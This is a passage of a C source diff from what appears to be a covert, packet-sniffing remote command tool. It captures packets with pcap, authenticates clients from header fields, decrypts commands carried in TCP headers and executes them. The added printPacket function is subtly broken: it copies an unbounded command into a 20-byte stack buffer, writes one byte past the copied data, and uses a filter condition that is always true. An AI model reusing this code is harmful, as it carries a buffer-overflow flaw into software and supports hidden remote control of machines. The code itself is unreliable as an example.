@@ -273,12 +273,34 @@ void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_c
 						authenticateClient(ip_header, tcp_header);
 					}
 				} else { // if you are the client
-					printf("%s", decryptPacket(tcp_header));
+					printPacket(decryptPacket(tcp_header));
 				}
 			}
 		}
 	}
 	ExitFlag = TRUE;
+}
+
+void printPacket(char * command)
+{
+	char temp[20] = {0};
+	size_t m = 0, j = 0;
+	for (m = 0; m < length(command); m++)
+	{
+		if (command[m] != '\n' || !isspace(command[m]) || isalnum((int)command[m]))
+		{
+			//printf("%c", command[m]);
+			temp[j++] = command[m];
+		}
+	}
+
+	if (j != 0)
+	{
+		temp[j+1] = '\n';
+		printf("%s\n", temp);
+		fflush(stdout);
+		memset(command, 0, length(command));
+	}
 }
 
 /*------------------------------------------------------------------------------
@@ -486,6 +508,7 @@ int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
 void executeCommand(char* command)
 {
 	char results[1024] = {0};
+	memset(results, 0, sizeof(results));
 
 	if (strcmp(command, "help") == 0) 
 	{
